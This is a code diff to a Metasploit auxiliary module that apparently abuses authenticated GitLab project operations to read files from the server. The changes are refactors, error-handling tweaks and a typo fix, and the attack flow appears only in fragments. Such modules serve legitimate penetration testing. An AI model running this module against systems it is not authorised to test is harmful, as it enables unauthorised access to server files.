@@ -7,8 +7,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HTTP::Gitlab
   include Msf::Auxiliary::Report
-
-  attr_accessor :cookie
+  prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
     super(
@@ -78,9 +77,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def check
     # check method almost entirely borrowed from gitlab_github_import_rce_cve_2022_2992
-    self.cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) unless cookie
+    @cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD'])
 
-    raise Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError if cookie.nil?
+    raise Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError if @cookie.nil?
 
     vprint_status('Trying to get the GitLab version')
 
@@ -100,7 +99,7 @@ class MetasploitModule < Msf::Auxiliary
     return Exploit::CheckCode::Appears("Detected GitLab version #{version} which is vulnerable.")
   rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError
     return Exploit::CheckCode::Detected('Could not detect the version because authentication failed.')
-  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error => e
+  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::ClientError => e
     return Exploit::CheckCode::Unknown("#{e.class} - #{e.message}")
   end
 
@@ -110,12 +109,12 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     begin
-      self.cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) unless cookie
+      @cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) if @cookie.nil?
     rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError
       fail_with(Failure::NoAccess, 'Unable to authenticate, check credentials')
     end
 
-    fail_with(Failure::NoAccess, 'Unable to retrieve cookie') if cookie.nil?
+    fail_with(Failure::NoAccess, 'Unable to retrieve cookie') if @cookie.nil?
 
     # get our csrf token
     res = send_request_cgi({
@@ -160,6 +159,7 @@ class MetasploitModule < Msf::Auxiliary
       # grab our parent group ID for nesting
       res.body =~ /data-clipboard-text="([^"]+)" type="button" title="Copy group ID"/
       parent_id = ::Regexp.last_match(1)
+      fail_with(Failure::UnexpectedReply, "#{peer} - Cannot retrieve the parent ID from the HTML response") unless parent_id
     end
 
     # create a new project
@@ -182,7 +182,6 @@ class MetasploitModule < Msf::Auxiliary
     })
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
     fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 302
-    # csrf_token = get_csrf(res.body)
 
     project_id = URI(res.headers['Location']).path
 
@@ -231,7 +230,7 @@ class MetasploitModule < Msf::Auxiliary
     })
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
     if res.code == 500
-      print_error("Unable to read file (permissions, or file doens't exist)")
+      print_error("Unable to read file (permissions, or file doesn't exist)")
     elsif res.code != 200
       print_error("#{peer} - Unexpected response code (#{res.code})") # don't fail_with so we can cleanup
     end
